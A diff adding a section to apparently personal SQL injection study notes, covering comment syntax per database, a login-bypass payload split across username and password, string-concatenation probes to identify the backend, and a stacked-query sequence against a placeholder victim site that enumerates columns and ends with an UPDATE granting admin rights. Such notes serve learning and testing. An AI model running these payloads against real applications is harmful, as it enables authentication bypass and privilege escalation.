@@ -76,7 +76,37 @@ Condition
 
 ### 3. Terminating SQL injection
 
-- 
+#### a. Comment
+
++ --: MS SQL Sever, Oracle, PostgreSQL one-line
++ /**/: MS SQL Sever, Oracle, PostgreSQL multiple-lines
+
++ --space/tab/new line/...: MySQL one-line
++ #: MySQL one-line
++ /**/: MySQL multiple-lines
+
+- Exp for situation when only can use /**/:
+username = admin'/*
+password = */'
+-> SELECT * FROM users WHERE username='admin'/*' AND password='*/''
+-> SELECT * FROM users WHERE username='admin'''
+-> SELECT * FROM users WHERE username='admin'
+
+- Define the remote database:
+https://www.victim.com/displayUser.aspx?User=Bob -> Default
++ User=B'+'ob -> MS SQL
++ User=B''ob -> MySQL
++ User=B'||'ob -> Oracle or PosgreSQL
+
+#### b. Execute Multiple Statement
+
+- Test to know all the columns
++ https://www.victim.com/welcome.aspx?User=45; select * from users having 1=1;-- -> Error contain GROUP BY and column name
++ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid having 1=1;-- -> Missing column, keep adding
++ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user having 1=1;-- -> Missing column, keep adding
++ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user, password having 1=1;-- -> Missing column, keep adding
++ https://www.victim.com/welcome.aspx?User=45; select * from users group by uid, user, password, isadmin having 1=1;-- -> Gotcha, we now know isAdmin, escalate priviledge.
++ https://www.victim.com/welcome.aspx?User=45; UPDATE Users SET isadmin=1 where uid=45-- -> We now become an member of admin's group.
 
 ### 4. Time Delays
 
